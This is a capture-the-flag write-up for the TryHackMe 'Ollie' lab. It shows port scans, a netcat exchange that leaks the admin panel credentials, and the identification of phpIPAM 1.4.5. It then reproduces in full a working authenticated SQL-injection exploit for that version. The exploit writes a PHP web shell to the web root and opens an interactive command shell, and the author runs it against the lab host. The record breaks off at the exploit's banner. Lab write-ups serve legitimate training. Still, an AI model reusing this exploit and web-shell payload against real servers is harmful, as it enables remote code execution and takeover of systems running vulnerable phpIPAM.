---
Meet the world's most powerful hacker dog!
---

# Ollie — Writeup

## Overview
### Ollie — Writeup
### Ollie — Writeup
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/c9a9e59d232db4474759bbf89a1d821a.jpeg)
### ROOF ROOF
Start Machine
Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for development... not so much! Rumor has it, Ollie messed with a few of the files on the server to ensure backward compatibility. Take control before time runs out!
**_Rest in Peace 1/5/2023_**
**_Please allow up to 3 minutes for the machine to boot._**
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/bug_hunter/s3brute]
└─$ rustscan -a 10.10.133.68 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.133.68:22
Open 10.10.133.68:80
Open 10.10.133.68:1337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 13:00 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:00
Completed Parallel DNS resolution of 1 host. at 13:00, 13.01s elapsed
DNS resolution of 1 IPs took 13.02s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 13:00
Scanning 10.10.133.68 [3 ports]
Discovered open port 22/tcp on 10.10.133.68
Discovered open port 80/tcp on 10.10.133.68
Discovered open port 1337/tcp on 10.10.133.68
Completed Connect Scan at 13:00, 0.20s elapsed (3 total ports)
Initiating Service scan at 13:00
Scanning 3 services on 10.10.133.68
Completed Service scan at 13:03, 161.94s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.133.68.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:03
NSE Timing: About 98.81% done; ETC: 13:04 (0:00:00 remaining)
NSE Timing: About 99.29% done; ETC: 13:04 (0:00:00 remaining)
NSE Timing: About 99.76% done; ETC: 13:05 (0:00:00 remaining)
Completed NSE at 13:05, 100.14s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 1.89s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
Nmap scan report for 10.10.133.68
Host is up, received user-set (0.19s latency).
Scanned at 2023-02-24 13:00:54 EST for 265s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b71ba8f88c8a4a5355c02e8901f25669 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP5+l/iCTR0Sqa4q0dIntXiVyRE5hsnPV5UfG4D+sQKeM4XoG7mzycPzJxn9WkONCwgmLWyFD1wHOnexqtxEOoyCrHhP2xGz+5sOsJ7RbpA0KL/CAUKs2aCtonKUwg5FEhOjUy945M0e/DmstbOYx8od6603eb4TytHfxQHPPiWBBRCmg6e+5UjcHLSOqDEzXkDOmmLieiE008fEVrNAmF2J+I4XPJI7Usaf3IzpnaFm3Ca9YvNAr4t8gpDST2uNuRWA9NCMspBFEj/5YQfjOnYx2cSSZHUP3lK8tiwc/RWSk7OBTXYOBncyV4lw8OiyJ1fOhr/2gXTXE/tWQvu1zKWYYafMKRdsH6nuE5nZ0CK3pLHe/nUgIsVPl7sJ3QlqJF7Wd5OmY3e4Py7movqFm/HmW+zjwsXGHnzENC47N+RxV0XTYCxbKzTAZDo5gLMxmsbXWnQmU5GMk0e9sh7HHybmWWkKKYJiOp+3yM9vTPXPiNXBeJmvWa01hoAAi+3OU=
|   256 4e2743b6f454f918d038dacd769b8548 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFL/P1VyyCYVY2aUZcXTLmHkiXGo4/KdJptRP7Wioy78Sb/W/bKDAq3Yl6a6RQW7KlGSbZ84who5gWwVMTSTt2U=
|   256 1482cabb04e501839cd654e9d1fac482 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHmTKDYCCJVK6wx0kZdjLd1YZeLryW/qXfKAfzqN/UHv
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1337/tcp open  waste?  syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     version
|     bind
|     It's been a while. What are you here for?
|   GetRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
|   HTTPOptions: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / http/1.0
|     It's been a while. What are you here for?
|   Help: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Help
|     It's been a while. What are you here for?
|   NULL, RPCCheck: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name?
|   RTSPRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / rtsp/1.0
|_    It's been a while. What are you here for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.93%I=7%D=2/24%Time=63F8FB5D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\
SF:x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20
SF:")%r(GenericLines,93,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x2
SF:0of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20you
SF:r\x20name\?\x20What's\x20up,\x20\r\n\r!\x20It's\x20been\x20a\x20while\.
SF:\x20What\x20are\x20you\x20here\x20for\?\x20")%r(GetRequest,A1,"Hey\x20s
SF:tranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\
SF:x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x
SF:20Get\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\
SF:x20are\x20you\x20here\x20for\?\x20")%r(HTTPOptions,A5,"Hey\x20stranger,
SF:\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\
SF:x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Option
SF:s\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20a
SF:re\x20you\x20here\x20for\?\x20")%r(RTSPRequest,A5,"Hey\x20stranger,\x20
SF:I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20a
SF:ntlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Options\x2
SF:0/\x20rtsp/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x
SF:20you\x20here\x20for\?\x20")%r(RPCCheck,59,"Hey\x20stranger,\x20I'm\x20
SF:Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\
SF:.\n\nWhat\x20is\x20your\x20name\?\x20")%r(DNSVersionBindReqTCP,B0,"Hey\
SF:x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x2
SF:0of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20u
SF:p,\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10\0
SF:\x03!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20here\x20
SF:for\?\x20")%r(DNSStatusRequestTCP,9E,"Hey\x20stranger,\x20I'm\x20Ollie,
SF:\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nW
SF:hat\x20is\x20your\x20name\?\x20What's\x20up,\x20\0\x0c\0\0\x10\0\0\0\0\
SF:0\0\0\0\0!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20her
SF:e\x20for\?\x20")%r(Help,95,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protec
SF:tor\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\
SF:x20your\x20name\?\x20What's\x20up,\x20Help\r!\x20It's\x20been\x20a\x20w
SF:hile\.\x20What\x20are\x20you\x20here\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 282.87 seconds

┌──(witty㉿kali)-[~/bug_hunter/s3brute]
└─$ nc 10.10.133.68 1337                    
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? Ollie
What's up, Ollie! It's been a while. What are you here for? exploit
Ya' know what? Ollie. If you can answer a question about me, I might have something for you.

What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!

PS: Good luck and next time bring some treats!

┌──(witty㉿kali)-[~/bug_hunter/s3brute]
└─$ ssh admin@10.10.133.68 
^C

Deactivate WARP

http://10.10.133.68/index.php?page=login

view-source:http://10.10.133.68/index.php?page=login

<a href="http://phpipam.net">phpIPAM IP address management [v1.4.5]</a>

https://www.exploit-db.com/exploits/50963
https://fluidattacks.com/advisories/mercury/

cat 50963.py
```
```text
# Exploit Title: phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)
```
```text
# Date: 2022-04-10
```
```text
# Exploit Author: Guilherme '@behiNdyk1' Alves
```
```text
# Vendor Homepage: https://phpipam.net/
```
```text
# Software Link: https://github.com/phpipam/phpipam/releases/tag/v1.4.5
```
```text
# Version: 1.4.5
```
```text
# Tested on: Linux Ubuntu 20.04.3 LTS

#!/usr/bin/env python3

import requests
import argparse
from sys import exit, argv
from termcolor import colored

banner = """
█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄\n"""
print(banner)

parser = argparse.ArgumentParser(usage="./exploit.py -url http://domain.tld/ipam_base_url -usr username -pwd password -cmd 'command_to_execute' --path /system/writable/path/to/save/shell", description="phpIPAM 1.4.5 - (Authenticated) SQL Injection to RCE")

parser.add_argument("-url", type=str, help="URL to vulnerable IPAM", required=True)
parser.add_argument("-usr", type=str, help="Username to log in as", required=True)
parser.add_argument("-pwd", type=str, help="User's password", required=True)
parser.add_argument("-cmd", type=str, help="Command to execute", default="id")
parser.add_argument("--path", type=str, help="Path to writable system folder and accessible via webserver (default: /var/www/html)", default="/var/www/html")
parser.add_argument("--shell", type=str, help="Spawn a shell (non-interactive)", nargs="?")
args = parser.parse_args()

url = args.url
username = args.usr
password = args.pwd
command = args.cmd
path = args.path
```

## Exploitation
```text
# Validating url
if url.endswith("/"):
	url = url[:-1]
if not url.startswith("http://") and not url.startswith("https://"):
	print(colored("[!] Please specify a valid scheme (http:// or https://) before the domain.", "yellow"))
	exit()

def login(url, username, password):
	"""Takes an username and a password and tries to execute a login (IPAM)"""
	data = {
	"ipamusername": username,
	"ipampassword": password
	}
	print(colored(f"[...] Trying to log in as {username}", "blue"))
	r = requests.post(f"{url}/app/login/login_check.php", data=data)
	if "Invalid username or password" in r.text:
		print(colored(f"[-] There's an error when trying to log in using these credentials --> {username}:{password}", "red"))
		exit()
	else:
		print(colored("[+] Login successful!", "green"))
		return str(r.cookies['phpipam'])

auth_cookie = login(url, username, password)

def exploit(url, auth_cookie, path, command):
	print(colored("[...] Exploiting", "blue"))
	vulnerable_path = "app/admin/routing/edit-bgp-mapping-search.php"
	data = {
	"subnet": f"\" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '{path}/evil.php' -- -",
	"bgp_id": "1"
	}
	cookies = {
	"phpipam": auth_cookie
	}
	requests.post(f"{url}/{vulnerable_path}", data=data, cookies=cookies)
	test = requests.get(f"{url}/evil.php")
	if test.status_code != 200:
		return print(colored(f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1", "red"))
	if "--shell" in argv:
		while True:
			command = input("Shell> ")
			r = requests.get(f"{url}/evil.php?cmd={command}")
			print(r.text)
	else:
		print(colored(f"[+] Success! The shell is located at {url}/evil.php. Parameter: cmd", "green"))
		r = requests.get(f"{url}/evil.php?cmd={command}")
		print(f"\n\n[+] Output:\n{r.text}")

exploit(url, auth_cookie, path, command)    

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 50963.py -url http://10.10.133.68 -usr admin -pwd OllieUnixMontgomery! -cmd 'id' 

█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
